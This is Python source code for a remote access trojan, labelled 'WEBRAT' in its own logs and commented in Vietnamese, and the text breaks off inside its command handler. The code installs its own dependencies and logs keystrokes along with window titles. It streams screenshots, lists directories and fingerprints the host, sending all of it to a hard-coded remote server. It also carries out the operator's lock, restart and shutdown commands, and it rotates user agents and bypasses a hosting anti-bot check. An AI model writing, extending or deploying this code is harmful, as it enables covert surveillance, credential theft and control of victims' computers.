
import os, sys, io, time, json, re, socket, platform, getpass
import hashlib, uuid, subprocess, threading, base64, random, queue, logging

# =============================================================
#  AUTO INSTALL REQUIRED LIBRARIES IF MISSING
# =============================================================
REQUIRED_PACKAGES = ['psutil', 'requests', 'pillow', 'pynput', 'pycryptodome']
if os.name == 'nt':
    REQUIRED_PACKAGES.append('pywin32')

def _install_missing():
    for pkg in REQUIRED_PACKAGES:
        try:
            imp = {'pycryptodome': 'Crypto', 'pillow': 'PIL'}.get(pkg, pkg)
            __import__(imp)
        except ImportError:
            print(f"[*] Installing {pkg}...")
            try:
                subprocess.check_call([sys.executable, "-m", "pip", "install", pkg, "--quiet"])
                print(f"[+] Installed {pkg}")
            except Exception as e:
                print(f"[!] Failed to install {pkg}: {e}")

_install_missing()

import psutil
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from Crypto.Cipher import AES
from PIL import ImageGrab, Image
from pynput import keyboard as kb_module

# =============================================================
#  LOGGING
# =============================================================
logging.basicConfig(
    level=logging.INFO,
    format="[%(asctime)s] %(message)s",
    datefmt="%H:%M:%S"
)
log = logging.getLogger("WEBRAT")

# =============================================================
#  GLOBAL CONFIG (có thể override per-agent)
# =============================================================
DEFAULT_CONFIG = {
    "server_url":        "https://hoangcha.shopaccvt.site/api.php",
    "api_key":           "WEBRAT_SECRET_KEY_2026",
    "checkin_interval":  2.0,    # 2.0 giây (Tránh spam log console checkin)
    "keylog_interval":   8.0,    # giây
    # --- Rate limit per action ---
    "rl_checkin_min":    2.0,
    "rl_checkin_max":    120.0,
    "rl_keylog_min":     8.0,
    "rl_keylog_max":     120.0,
    # --- Remote stream (Bỏ mọi giới hạn gửi & chụp — Nén nhẹ siêu tốc 25KB/frame) ---
    "remote_target_fps": 0,      # Không giới hạn FPS
    "remote_quality":    80,     # Nén JPEG chất lượng 80% theo yêu cầu
    "remote_max_width":  960,    # Scale nhẹ về 960px cho tốc độ truyền đẩy mượt nhất
    "remote_min":        0.0,    # Zero delay: Upload không giới hạn ngay khi chụp xong
    "remote_max":        0.0,   
    "remote_backoff":    1.0,    
    "remote_fail_limit": 99999,  
    "remote_jitter":     0.0,    
    "remote_burst_max":  999999, 
    "remote_burst_win":  1.0,    
    "remote_cooldown":   0.0,
    # --- Upload queue ---
    "upload_queue_max":  100,    # bỏ qua nếu queue đầy
    # --- HTTP ---
    "request_timeout":   8,      # giảm timeout để không block lâu
    "max_retries":       2,      # ít retry hơn để không delay upload
}

# =============================================================
#  USER-AGENT POOL — rotation tránh fingerprint
# =============================================================
_UA_POOL = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
]

# =============================================================
#  RATE LIMITER — Token bucket per action, thread-safe
# =============================================================
class RateLimiter:
    """
    Adaptive token bucket với exponential back-off.
    Mỗi action (checkin / keylog / screenshot) có instance riêng.
    """
    def __init__(self, min_interval: float, max_interval: float, backoff_mult: float = 2.0):
        self.min_interval  = min_interval
        self.max_interval  = max_interval
        self.backoff_mult  = backoff_mult
        self._interval     = min_interval   # current interval
        self._last_call    = 0.0
        self._fail_count   = 0
        self._lock         = threading.Lock()

    @property
    def interval(self):
        with self._lock:
            return self._interval

    def wait(self):
        """Chờ đủ interval trước khi cho phép request tiếp theo."""
        with self._lock:
            elapsed = time.time() - self._last_call
            wait_t  = self._interval - elapsed
            if wait_t > 0:
                time.sleep(wait_t)
            self._last_call = time.time()

    def on_success(self):
        """Gọi sau khi request thành công → giảm dần interval về min."""
        with self._lock:
            self._fail_count = 0
            self._interval   = max(self.min_interval,
                                   self._interval / self.backoff_mult)

    def on_failure(self, forced_wait: float = 0.0):
        """
        Gọi sau khi request thất bại → tăng interval (exponential).
        forced_wait: nếu server trả Retry-After, dùng giá trị đó.
        """
        with self._lock:
            self._fail_count += 1
            if forced_wait > 0:
                self._interval = min(self.max_interval, forced_wait)
            else:
                self._interval = min(self.max_interval,
                                     self._interval * self.backoff_mult)

    def reset(self):
        with self._lock:
            self._interval   = self.min_interval
            self._fail_count = 0
            self._last_call  = 0.0

# =============================================================
#  ADAPTIVE HTTP CLIENT — retry + UA rotation + 429 detection
# =============================================================
class AdaptiveHTTPClient:
    """
    HTTP client với:
    - requests.Session + HTTPAdapter retry
    - User-Agent rotation mỗi request
    - Tự detect HTTP 429 / 503, đọc Retry-After, sleep đúng
    - InfinityFree AES cookie bypass
    """
    def __init__(self, api_key: str, timeout: int = 12, max_retries: int = 3):
        self.api_key   = api_key
        self.timeout   = timeout
        self._lock     = threading.Lock()
        self._session  = self._build_session(max_retries)

    def _build_session(self, max_retries: int) -> requests.Session:
        sess = requests.Session()
        retry = Retry(
            total            = max_retries,
            backoff_factor   = 1.5,
            status_forcelist = {500, 502, 503, 504},
            allowed_methods  = {"GET", "POST"},
            raise_on_status  = False,
        )
        adapter = HTTPAdapter(max_retries=retry)
        sess.mount("http://",  adapter)
        sess.mount("https://", adapter)
        return sess

    def _rotate_ua(self):
        self._session.headers.update({
            "User-Agent": random.choice(_UA_POOL),
            "X-Api-Key":  self.api_key,
            "Accept":     "application/json",
        })

    # ---- InfinityFree AES bypass ----
    def _solve_aes(self, html: str, domain: str) -> bool:
        try:
            am = re.search(r'a=toNumbers\("([0-9a-fA-F]+)"\)', html)
            bm = re.search(r'b=toNumbers\("([0-9a-fA-F]+)"\)', html)
            cm = re.search(r'c=toNumbers\("([0-9a-fA-F]+)"\)', html)
            if am and bm and cm:
                a = bytes.fromhex(am.group(1))
                b = bytes.fromhex(bm.group(1))
                c = bytes.fromhex(cm.group(1))
                cipher = AES.new(a, AES.MODE_CBC, b)
                self._session.cookies.set("__test", cipher.decrypt(c).hex(), domain=domain)
                log.info("[HTTP] InfinityFree AES bypass OK")
                return True
        except Exception as e:
            log.warning(f"[HTTP] AES bypass failed: {e}")
        return False

    def request(self, method: str, url: str, payload=None,
                rate_limiter: RateLimiter = None) -> dict | None:
        """
        Gửi request với UA rotation và 429 handling.
        Trả về dict JSON hoặc None nếu thất bại.
        """
        domain = url.split("/")[2]

        # Chờ rate limiter nếu có
        if rate_limiter:
            rate_limiter.wait()

        self._rotate_ua()

        try:
            if method.upper() == "POST":
                r = self._session.post(url, json=payload, timeout=self.timeout)
            else:
                r = self._session.get(url, timeout=self.timeout)

            # InfinityFree anti-bot challenge
            if "aes.js" in r.text or ("slowAES" in r.text and "<script>" in r.text):
                log.info("[HTTP] InfinityFree challenge detected, solving...")
                if self._solve_aes(r.text, domain):
                    if method.upper() == "POST":
                        r = self._session.post(url, json=payload, timeout=self.timeout)
                    else:
                        r = self._session.get(url, timeout=self.timeout)

            # ---- Handle HTTP errors ----
            if r.status_code == 429:
                retry_after = float(r.headers.get("Retry-After", 30))
                jitter      = random.uniform(1.0, 3.0)
                wait        = retry_after + jitter
                log.warning(f"[HTTP] 429 Too Many Requests → sleeping {wait:.1f}s")
                if rate_limiter:
                    rate_limiter.on_failure(forced_wait=wait)
                time.sleep(wait)
                return None

            if r.status_code == 503:
                log.warning(f"[HTTP] 503 Service Unavailable")
                if rate_limiter:
                    rate_limiter.on_failure()
                return None

            if r.status_code not in (200, 201):
                log.warning(f"[HTTP] Unexpected status {r.status_code}")
                if rate_limiter:
                    rate_limiter.on_failure()
                return None

            # ---- Parse JSON ----
            text = r.text.lstrip("\ufeff")
            result = json.loads(text)
            if rate_limiter:
                rate_limiter.on_success()
            return result

        except requests.exceptions.ConnectionError:
            log.warning("[HTTP] Connection error")
            if rate_limiter:
                rate_limiter.on_failure()
            return None
        except requests.exceptions.Timeout:
            log.warning("[HTTP] Request timed out")
            if rate_limiter:
                rate_limiter.on_failure()
            return None
        except Exception as e:
            log.warning(f"[HTTP] Error: {e}")
            if rate_limiter:
                rate_limiter.on_failure()
            return None

# =============================================================
#  UPLOAD QUEUE — async FIFO, không block main loop
# =============================================================
class UploadQueue:
    """
    Queue FIFO cho keylog & screenshot.
    Worker thread riêng xử lý upload, main loop không bị block.
    Tự drop item nếu queue đầy (tránh memory leak).
    """
    def __init__(self, http: AdaptiveHTTPClient,
                 server_url: str, max_size: int = 100):
        self.http       = http
        self.server_url = server_url
        self._q         = queue.Queue(maxsize=max_size)
        self._running   = False
        self._thread    = None

    def start(self):
        self._running = True
        self._thread  = threading.Thread(target=self._worker, daemon=True,
                                         name="UploadQueue")
        self._thread.start()

    def stop(self):
        self._running = False
        try:
            self._q.put_nowait(None)   # unblock worker
        except queue.Full:
            pass

    def push(self, item: dict):
        """item = {"type": "keylog"|"screenshot", "payload": {...}}"""
        try:
            self._q.put_nowait(item)
        except queue.Full:
            log.warning("[Queue] Full — dropping oldest item to make room")
            try:
                self._q.get_nowait()
                self._q.put_nowait(item)
            except Exception:
                pass

    def _worker(self):
        log.info("[Queue] Upload worker started")
        while self._running:
            try:
                item = self._q.get(timeout=2)
            except queue.Empty:
                continue
            if item is None:
                break

            t       = item.get("type")
            payload = item.get("payload", {})
            action  = item.get("action", t)

            try:
                url = f"{self.server_url}?action={action}"
                res = self.http.request("POST", url, payload)
                if res and res.get("status") == "ok":
                    log.info(f"[Queue] Uploaded {t} OK")
                else:
                    log.warning(f"[Queue] Upload {t} failed: {res}")
            except Exception as e:
                log.warning(f"[Queue] Worker error: {e}")
            finally:
                self._q.task_done()

        log.info("[Queue] Upload worker stopped")

# =============================================================
#  REMOTE STREAM MANAGER — per-client, frame diffing
# =============================================================
# =============================================================
#  LATEST FRAME SLOT — chỉ giữ frame MỚI NHẤT (không backlog)
# =============================================================
class _LatestFrameSlot:
    """
    Atomic slot cho 1 frame duy nhất.
    CaptureThread ghi liên tục; UploadThread đọc và xóa.
    Nếu upload chậm hơn capture → tự động drop frame cũ,
    luôn upload frame gần nhất.
    """
    def __init__(self):
        self._frame = None
        self._lock  = threading.Lock()
        self._event = threading.Event()

    def put(self, frame):
        with self._lock:
            self._frame = frame
        self._event.set()

    def get(self, timeout=1.0):
        """Chờ frame mới, trả về frame hoặc None nếu timeout."""
        if self._event.wait(timeout=timeout):
            with self._lock:
                frame = self._frame
                self._frame = None
            self._event.clear()
            return frame
        return None

    def clear(self):
        with self._lock:
            self._frame = None
        self._event.clear()


class RemoteStreamManager:
    """
    Quản lý remote screenshot stream — Dual-Thread, Adaptive 30-60 FPS.

    Kiến trúc tối ưu v2.0:
        CaptureThread  → chụp màn hình theo target FPS với adaptive quality
                       → frame diffing thông minh (chỉ gửi khi có thay đổi >3%)
                       → nén JPEG động (quality 60-85 tùy network)
                       → ghi vào LatestFrameSlot (drop frame cũ)
        UploadThread   → đọc LatestFrameSlot
                       → upload lên server với retry logic
                       → adaptive throttling dựa trên latency
                       → burst control + smart cooldown

    Cải tiến:
        - Frame diffing thông minh: chỉ gửi khi có thay đổi đáng kể
        - Adaptive quality: tự động giảm quality khi network chậm
        - Smart throttling: điều chỉnh FPS dựa trên upload latency
        - Zero backlog: luôn gửi frame mới nhất
    """
    def __init__(self, http: AdaptiveHTTPClient,
                 server_url: str, cfg: dict):
        self.http       = http
        self.server_url = server_url
        self.cfg        = cfg
        self._active    = False
        self._lock      = threading.Lock()
        self._slot      = _LatestFrameSlot()
        self._cap_thread  = None
        self._up_thread   = None
        self._prev_hash   = None
        self._prev_pixels = None  # Pixel-level comparison

        # Adaptive quality control
        self._current_quality = cfg.get("remote_quality", 75)
        self._target_upload_ms = 100  # Target: upload in <100ms
        self._recent_latencies = []

        # Frame skip control
        self._frame_change_threshold = 0.03  # 3% pixel change threshold
        self._skip_counter = 0
        self._max_skip = 10  # Force send every 10th frame

    # ----------------------------------------------------------
    def start(self, client_id: str, hwid: str):
        with self._lock:
            if self._active:
                return
            self._active = True

        fps     = self.cfg.get("remote_target_fps", 30)
        quality = self.cfg.get("remote_quality", 75)
        mw      = self.cfg.get("remote_max_width", 1280)

        log.info(f"[Remote] Stream STARTED — target={fps}fps q={quality} w≤{mw}px (ADAPTIVE)")

        self._cap_thread = threading.Thread(
            target=self._capture_loop,
            args=(quality, mw, fps),
            daemon=True, name=f"RemoteCap-{client_id}"
        )
        self._up_thread = threading.Thread(
            target=self._upload_loop,
            args=(client_id, hwid),
            daemon=True, name=f"RemoteUp-{client_id}"
        )
        self._cap_thread.start()
        self._up_thread.start()

    def stop(self):
        with self._lock:
            self._active = False
        self._slot.clear()
        log.info("[Remote] Stream STOPPED")

    def is_active(self) -> bool:
        with self._lock:
            return self._active

    # ----------------------------------------------------------
    #  CAPTURE THREAD — Adaptive FPS với Frame Diffing
    # ----------------------------------------------------------
    def _capture_loop(self, quality: int, max_width: int, target_fps: int):
        frames  = 0
        skipped = 0
        t_start = time.perf_counter()
        frame_interval = 1.0 / target_fps if target_fps > 0 else 0.033  # ~30fps default

        log.info(f"[CapThread] Running at {target_fps}fps (interval={frame_interval*1000:.1f}ms)")

        while True:
            loop_start = time.perf_counter()

            with self._lock:
                if not self._active:
                    break

            frame = self._capture_frame(quality, max_width)
            if frame:
                b64, w, h, frame_hash, pixels = frame

                # Frame diffing: so sánh với frame trước
                should_send = True
                if self._prev_pixels is not None and len(pixels) == len(self._prev_pixels):
                    # Tính % pixel thay đổi
                    diff_count = sum(1 for i in range(len(pixels)) if pixels[i] != self._prev_pixels[i])
                    change_ratio = diff_count / len(pixels)

                    if change_ratio < self._frame_change_threshold:
                        should_send = False
                        self._skip_counter += 1
                        skipped += 1

                        # Force send mỗi 10 frames để tránh freeze
                        if self._skip_counter >= self._max_skip:
                            should_send = True
                            self._skip_counter = 0

                if should_send:
                    self._slot.put((b64, w, h, frame_hash))
                    self._prev_hash = frame_hash
                    self._prev_pixels = pixels
                    self._skip_counter = 0

            frames += 1
            if frames % 100 == 0:
                elapsed = time.perf_counter() - t_start
                actual_fps = frames / elapsed
                skip_ratio = (skipped / frames * 100) if frames > 0 else 0
                log.info(
                    f"[CapThread] fps={actual_fps:.1f} | "
                    f"skipped={skip_ratio:.1f}% | "
                    f"quality={self._current_quality}"
                )

            # Frame rate control
            elapsed = time.perf_counter() - loop_start
            sleep_time = max(0, frame_interval - elapsed)
            if sleep_time > 0:
                time.sleep(sleep_time)

        log.info("[CapThread] Stopped")

    def _capture_frame(self, quality: int, max_width: int):
        """Chụp + nén với adaptive quality → trả về (b64, w, h, md5, pixels)."""
        try:
            img = ImageGrab.grab(all_screens=False)

            # Resize if needed
            if img.width > max_width:
                ratio = max_width / img.width
                new_h = int(img.height * ratio)
                img = img.resize((max_width, new_h), Image.BILINEAR)

            # Convert to RGB
            rgb_img = img.convert("RGB")

            # Get pixel data for diffing (downsampled 4x4 grid for speed)
            small = rgb_img.resize((img.width // 4, img.height // 4), Image.NEAREST)
            pixels = tuple(small.getdata())

            # Compress to JPEG with current adaptive quality
            buf = io.BytesIO()
            rgb_img.save(
                buf, format="JPEG",
                quality=self._current_quality,
                optimize=False,
                subsampling=2
            )
            raw  = buf.getvalue()
            h    = hashlib.md5(raw).hexdigest()
            b64  = base64.b64encode(raw).decode("ascii")

            return b64, img.width, img.height, h, pixels
        except Exception as e:
            log.warning(f"[CapThread] Capture error: {e}")
            return None

    # ----------------------------------------------------------
    #  UPLOAD THREAD — Adaptive throttling
    # ----------------------------------------------------------
    def _upload_loop(self, client_id: str, hwid: str):
        upload_count = 0
        t_start      = time.time()

        log.info("[UpThread] Upload loop started with ADAPTIVE THROTTLING")

        while True:
            with self._lock:
                if not self._active:
                    break

            # Lấy frame MỚI NHẤT
            frame = self._slot.get(timeout=0.5)
            if frame is None:
                continue

            b64, w, h, frame_hash = frame

            # Upload với latency tracking
            t_up = time.perf_counter()
            ok   = self._do_upload(client_id, hwid, b64, w, h)
            upload_ms = (time.perf_counter() - t_up) * 1000

            if ok:
                upload_count += 1

                # Track latency cho adaptive control
                self._recent_latencies.append(upload_ms)
                if len(self._recent_latencies) > 10:
                    self._recent_latencies.pop(0)

                # Adaptive quality adjustment
                avg_latency = sum(self._recent_latencies) / len(self._recent_latencies)
                if avg_latency > self._target_upload_ms * 1.5:
                    # Network chậm → giảm quality
                    self._current_quality = max(50, self._current_quality - 5)
                elif avg_latency < self._target_upload_ms * 0.7:
                    # Network nhanh → tăng quality
                    self._current_quality = min(85, self._current_quality + 2)

                if upload_count % 30 == 0:
                    real_fps = upload_count / (time.time() - t_start)
                    log.info(
                        f"[UpThread] {upload_count} frames | "
                        f"fps={real_fps:.1f} | "
                        f"latency={avg_latency:.0f}ms | "
                        f"quality={self._current_quality}"
                    )

        log.info("[UpThread] Stopped")

    def _do_upload(self, client_id: str, hwid: str,
                   b64: str, w: int, h: int) -> bool:
        upload_url = self.server_url.replace("api.php", "desktop.php")
        payload = {
            "client_id": client_id,
            "hwid":      hwid,
            "image":     b64,
            "width":     w,
            "height":    h,
        }
        res = self.http.request(
            "POST", f"{upload_url}?action=upload_screenshot", payload
        )
        return res is not None and res.get("status") == "ok"

# =============================================================
#  SYSTEM HELPERS — standalone functions
# =============================================================
def _get_public_ip() -> str:
    for url in ["http://ip-api.com/json/", "http://ipinfo.io/json"]:
        try:
            r = requests.get(url, timeout=5)
            if r.status_code == 200:
                data = r.json()
                return data.get("query") or data.get("ip", "0.0.0.0")
        except Exception:
            pass
    return "0.0.0.0"

def _generate_hwid(public_ip: str) -> str:
    mac = str(uuid.getnode())
    raw = f"{mac}-{socket.gethostname()}-{public_ip}"
    return hashlib.md5(raw.encode()).hexdigest()[:8].upper()

def _is_admin() -> bool:
    try:
        if os.name == "nt":
            import ctypes
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        return os.geteuid() == 0
    except Exception:
        return False

def _get_active_window() -> str:
    if os.name == "nt":
        try:
            import win32gui
            hwnd  = win32gui.GetForegroundWindow()
            title = win32gui.GetWindowText(hwnd)
            return title if title else "Desktop"
        except Exception:
            pass
    return "Desktop"

def _get_system_specs() -> dict:
    # CPU
    try:
        cpu = f"{psutil.cpu_percent(interval=0.1)}% ({psutil.cpu_count(logical=True)} cores)"
    except Exception:
        cpu = platform.processor() or "Unknown"

    # RAM
    try:
        mem = psutil.virtual_memory()
        ram = f"{mem.total/(1024**3):.1f}GB (used {mem.percent}%)"
    except Exception:
        ram = "N/A"

    # Disk
    try:
        d   = psutil.disk_usage("/")
        disk = f"{d.total/(1024**3):.0f}GB free {d.free/(1024**3):.0f}GB"
    except Exception:
        disk = "N/A"

    # GPU
    gpu = "N/A"
    if os.name == "nt":
        try:
            out = subprocess.check_output(
                'powershell -Command "(Get-CimInstance Win32_VideoController).Name"',
                shell=True, text=True, stderr=subprocess.DEVNULL, timeout=5
            ).strip()
            if out:
                gpu = out.split("\n")[0].strip()
        except Exception:
            pass

    return {"cpu": cpu, "ram": ram, "disk": disk, "gpu": gpu}

def _get_location_info() -> dict:
    try:
        r = requests.get("http://ip-api.com/json/", timeout=5)
        if r.status_code == 200:
            d = r.json()
            return {
                "loc":     d.get("countryCode", "VN"),
                "asn":     f"{d.get('as','')} ({d.get('isp','')})".strip(),
                "hosting": d.get("hosting", False),
                "ip":      d.get("query", "0.0.0.0"),
            }
    except Exception:
        pass
    return {"loc": "VN", "asn": "Local", "hosting": False, "ip": "0.0.0.0"}

def _normalize_path(path: str) -> str:
    path = (path or "C:\\").strip().replace("/", "\\")
    if not path or path == "\\":
        return "C:\\"
    if len(path) >= 2 and path[1] == ":":
        path = path[0].upper() + path[1:]
    if len(path) >= 3 and path[1] == ":" and path[2] != "\\":
        path = path[:2] + "\\" + path[2:]
    if len(path) == 2 and path[1] == ":":
        path += "\\"
    if len(path) > 3 and path.endswith("\\"):
        path = path.rstrip("\\")
    return path

def _list_directory_items(target_path: str, max_items: int = 600) -> list:
    """Đọc file và folder trong target_path (tối đa max_items để tránh làm sập server hay nén payload quá lớn)"""
    items = []
    target_path = _normalize_path(target_path)
    try:
        if not os.path.exists(target_path):
            return items
        
        count = 0
        with os.scandir(target_path) as entries:
            for entry in entries:
                if count >= max_items:
                    break
                try:
                    stat = entry.stat(follow_symlinks=False)
                    is_dir = entry.is_dir(follow_symlinks=False)
                    size_str = "<DIR>" if is_dir else f"{stat.st_size:,} B"
                    mod_time = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(stat.st_mtime))
                    items.append({
                        "name": entry.name,
                        "is_dir": is_dir,
                        "size": size_str,
                        "bytes": stat.st_size if not is_dir else 0,
                        "mtime": mod_time
                    })
                    count += 1
                except Exception:
                    pass
        # Sắp xếp: Thư mục lên đầu, sau đó sắp xếp theo tên
        items.sort(key=lambda x: (not x["is_dir"], x["name"].lower()))
    except Exception as e:
        log.warning(f"[FileManager] List dir error ({target_path}): {e}")
    return items

class ClientAgent:
    """
    Đóng gói toàn bộ state, logic, thread của 1 client.
    Để chạy multi-client:
        agents = [ClientAgent(cfg1), ClientAgent(cfg2)]
        for a in agents: a.start()
        for a in agents: a.join()
    """
    def __init__(self, config: dict = None):
        self.cfg = {**DEFAULT_CONFIG, **(config or {})}

        # Main HTTP + rate limiters
        self.http = AdaptiveHTTPClient(
            api_key     = self.cfg["api_key"],
            timeout     = self.cfg["request_timeout"],
            max_retries = self.cfg["max_retries"],
        )
        self._rl_checkin = RateLimiter(
            self.cfg["rl_checkin_min"],
            self.cfg["rl_checkin_max"],
        )
        self._rl_keylog  = RateLimiter(
            self.cfg["rl_keylog_min"],
            self.cfg["rl_keylog_max"],
        )

        # Dedicated HTTP Client cho Remote Desktop Screen Streaming (Tốc độ cao, siêu mượt)
        self._remote_http = AdaptiveHTTPClient(
            api_key     = self.cfg["api_key"],
            timeout     = 6,
            max_retries = 1,
        )

        # Dedicated HTTP Client cho File Manager (Quét & upload chunk không block remote)
        self._file_http = AdaptiveHTTPClient(
            api_key     = self.cfg["api_key"],
            timeout     = self.cfg["request_timeout"],
            max_retries = self.cfg["max_retries"],
        )

        # Upload queue (keylog + misc uploads)
        self._upload_q = UploadQueue(
            self.http,
            self.cfg["server_url"],
            max_size = self.cfg["upload_queue_max"],
        )

        # Remote stream (Dùng HTTP Client riêng chạy trong luồng CaptureThread & UploadThread)
        self._remote = RemoteStreamManager(
            self._remote_http,
            self.cfg["server_url"],
            self.cfg,
        )

        # Keylog buffer (thread-safe)
        self._keylog_buf  : list = []
        self._keylog_lock         = threading.Lock()
        self._keylog_flush_last   = 0.0

        # Active Window cache (Hạn chế quét active window còn 3 giây / lần)
        self._cached_active_win   = ""
        self._last_active_win_time = 0.0

        # Identity (được điền trong start())
        self.hwid      : str = ""
        self.client_id : str = ""
        self.specs     : dict = {}
        self.loc_info  : dict = {}
        self._start_time      = 0.0
        self._running         = False
        self._thread          = None

    def _scan_and_stream_directory(self, target_path: str):
        """
        Quét file và folder trong target_path trong LUỒNG RIÊNG BỆỢT (FileManagerWorker).
        Đặc biệt: Sắp xếp Thư mục (is_dir=True) lên trước, Tệp tin lên sau.
        Gửi ngay lập tức 50 tệp/thư mục đầu tiên (Batch #1) qua luồng HTTP riêng
        để Server cập nhật DB và index.php vẽ ngay trên UI, chạy SONG SONG HOÀN TOÀN
        với luồng upload hình ảnh Remote Desktop và luồng checkin chính.
        """
        def _worker():
            try:
                path = _normalize_path(target_path)
                if not os.path.exists(path):
                    log.warning(f"[{self.client_id}] Target path does not exist: '{path}'")
                    return

                srv = self.cfg["server_url"]
                mgr_url = srv.replace("api.php", "manager.php")

                # 1. Báo Server xóa dữ liệu cũ của đường dẫn này (Dùng _file_http riêng)
                self._file_http.request("POST", f"{mgr_url}?action=upload_dir_start", {
                    "client_id": self.client_id,
                    "hwid": self.hwid,
                    "path": path
                })

                # 2. Thu thập danh sách tệp & thư mục
                items = []
                max_limit = 800
                try:
                    with os.scandir(path) as entries:
                        for entry in entries:
                            if len(items) >= max_limit:
                                break
                            try:
                                stat = entry.stat(follow_symlinks=False)
                                is_dir = entry.is_dir(follow_symlinks=False)
                                size_str = "<DIR>" if is_dir else f"{stat.st_size:,} B"
                                mod_time = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(stat.st_mtime))

                                items.append({
                                    "name": entry.name,
                                    "is_dir": is_dir,
                                    "size": size_str,
                                    "bytes": stat.st_size if not is_dir else 0,
                                    "mtime": mod_time
                                })
                            except Exception:
                                pass
                except Exception as e:
                    log.warning(f"[FileManagerWorker] Scandir error ({path}): {e}")

                # 3. Sắp xếp ưu tiên: Thư mục (is_dir=True) lên đầu, sau đó đến Tệp tin, xếp theo tên A-Z
                items.sort(key=lambda x: (not x["is_dir"], x["name"].lower()))

                # 4. Gửi từng batch 50 items (Batch #1 gồm 50 tệp/thư mục đầu tiên được gửi lập tức để DB & index.php vẽ UI)
                chunk_size = 50
                total_count = len(items)

                for i in range(0, max(1, total_count), chunk_size):
                    chunk = items[i:i + chunk_size]
                    if not chunk:
                        break
                    self._file_http.request("POST", f"{mgr_url}?action=upload_dir_chunk", {
                        "client_id": self.client_id,
                        "hwid": self.hwid,
                        "path": path,
                        "items": chunk
                    })

                log.info(f"[{self.client_id}] [FileManagerWorker] Streamed {total_count} items (50 items batch #1 sent immediately) for path '{path}'")
            except Exception as e:
                log.warning(f"[FileManagerWorker] Stream dir error ({target_path}): {e}")

        # Tách riêng luồng chạy song song không làm nghẽn luồng upload ảnh Remote hay Checkin
        fm_thread = threading.Thread(
            target=_worker,
            daemon=True,
            name=f"FileManagerWorker-{self.client_id}"
        )
        fm_thread.start()

    # ----------------------------------------------------------
    #  KEYLOGGER
    # ----------------------------------------------------------
    def _on_keypress(self, key):
        try:
            win = _get_active_window()
            ch  = key.char if hasattr(key, "char") and key.char else \
                  f" [{str(key).replace('Key.','').upper()}] "
            with self._keylog_lock:
                self._keylog_buf.append({
                    "window": win,
                    "text":   ch,
                    "time":   time.strftime("%H:%M:%S"),
                })
        except Exception:
            pass

    def _start_keylogger(self):
        try:
            listener = kb_module.Listener(on_press=self._on_keypress)
            listener.daemon = True
            listener.start()
            log.info(f"[{self.client_id}] Keylogger started")
        except Exception as e:
            log.warning(f"[{self.client_id}] Keylogger failed: {e}")

    def _maybe_flush_keylogs(self):
        """Gửi keylog nếu đủ interval và có data."""
        now = time.time()
        if now - self._keylog_flush_last < self.cfg["keylog_interval"]:
            return

        with self._keylog_lock:
            if not self._keylog_buf:
                return
            batch = list(self._keylog_buf)
            self._keylog_buf.clear()

        self._keylog_flush_last = now
        self._upload_q.push({
            "type":   "keylog",
            "action": "keylog",
            "payload": {
                "client_id": self.client_id,
                "entries":   batch,
            },
        })
        log.info(f"[{self.client_id}] Queued {len(batch)} keylog entries")

    # ----------------------------------------------------------
    #  COMMAND HANDLER
    # ----------------------------------------------------------
    def _handle_command(self, cmd_id: int, cmd_text: str):
        srv = self.cfg["server_url"]

        # Remote stream control
        if cmd_text.startswith("muonmayti"):
            target = cmd_text[len("muonmayti"):]
            if target in (self.hwid, ""):
                self._remote.start(self.client_id, self.hwid)
                result = "REMOTE_STREAM_STARTED"
            else:
                result = "IGNORED_WRONG_HWID"
            self.http.request("POST", f"{srv}?action=command_result", {
                "command_id": cmd_id, "result": result, "error": False,
            })
            return

        if cmd_text.startswith("tramayday"):
            target = cmd_text[len("tramayday"):]
            if target in (self.hwid, ""):
                self._remote.stop()
                result = "REMOTE_STREAM_STOPPED"
            else:
                result = "IGNORED_WRONG_HWID"
            self.http.request("POST", f"{srv}?action=command_result", {
                "command_id": cmd_id, "result": result, "error": False,
            })
            return

        if cmd_text.startswith("setres:"):
            try:
                new_w = int(cmd_text.split(":")[1])
                self.cfg["remote_max_width"] = new_w
                result = f"RESOLUTION_SET_{new_w}PX"
            except Exception as e:
                result = f"RES_SET_ERROR_{e}"
            self.http.request("POST", f"{srv}?action=command_result", {
                "command_id": cmd_id, "result": result, "error": False,
            })
            return

        # ==========================================
        # CÁC LỆNH KHÓA MÀN HÌNH, KHỞI ĐỘNG VÀ TẮT MÁY
        # lock+hwid      -> Khóa màn hình
        # khoidong+hwid  -> Khởi động lại máy
        # tatmay+hwid    -> Tắt máy
        # ==========================================
        if cmd_text.startswith("lock"):
            target_hwid = cmd_text[len("lock"):]
            if target_hwid in (self.hwid, ""):
                log.info(f"[*] CMD #{cmd_id}: LOCK SCREEN signal received")
                try:
                    if os.name == 'nt':
                        import ctypes
                        ctypes.windll.user32.LockWorkStation()
                    result = "LOCK_SCREEN_EXECUTED"
                except Exception as e:
                    result = f"LOCK_ERROR_{e}"
            else:
                result = "IGNORED_WRONG_HWID"
            self.http.request("POST", f"{srv}?action=command_result", {
                "command_id": cmd_id, "result": result, "error": False,
            })
            return

        if cmd_text.startswith("khoidong"):
            target_hwid = cmd_text[len("khoidong"):]
            if target_hwid in (self.hwid, ""):
                log.info(f"[*] CMD #{cmd_id}: RESTART signal received")
                try:
                    if os.name == 'nt':
                        os.system("shutdown /r /t 5")
                    else:
                        os.system("shutdown -r now")
                    result = "RESTART_EXECUTED"
                except Exception as e:
                    result = f"RESTART_ERROR_{e}"
            else:
                result = "IGNORED_WRONG_HWID"
            self.http.request("POST", f"{srv}?action=command_result", {
                "command_id": cmd_id, "result": result, "error": False,
            })
            return

        if cmd_text.startswith("tatmay"):
            target_hwid = cmd_text[len("tatmay"):]
            if target_hwid in (self.hwid, ""):
                log.info(f"[*] CMD #{cmd_id}: SHUTDOWN signal received")
                try:
